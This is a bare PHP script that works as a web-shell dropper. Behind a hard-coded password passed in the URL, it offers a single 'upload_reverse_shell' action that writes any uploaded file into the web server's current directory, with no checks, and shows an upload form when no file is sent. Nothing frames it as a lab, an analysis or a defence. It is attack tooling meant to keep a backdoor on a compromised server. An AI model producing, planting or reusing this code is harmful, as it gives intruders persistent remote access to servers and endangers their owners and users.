<?php
// Configurable Password
$password = 'securepassword'; // Change this to a strong password

if (isset($_GET['password']) && $_GET['password'] === $password) {
    if (isset($_GET['action'])) {
        switch ($_GET['action']) {
            case 'upload_reverse_shell': // Upload reverse shell
                if (isset($_FILES['file'])) {
                    $upload_dir = getcwd(); // Upload to the current directory
                    $upload_file = $upload_dir . '/' . basename($_FILES['file']['name']);
                    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
                        echo "Reverse shell uploaded successfully: $upload_file";
                    } else {
                        echo "Failed to upload file.";
                    }
                } else {
                    echo '<form method="POST" enctype="multipart/form-data">
                            <input type="file" name="file">
                            <input type="submit" value="Upload Reverse Shell">
                          </form>';
                }
                break;

            default:
                echo "Invalid action. Supported actions: upload_reverse_shell.";
                break;
        }
    } else {
        echo "No action provided. Use ?action=upload_reverse_shell.";
    }
} else {
    header('HTTP/1.0 403 Forbidden');
    echo "Unauthorized access.";
}
?>

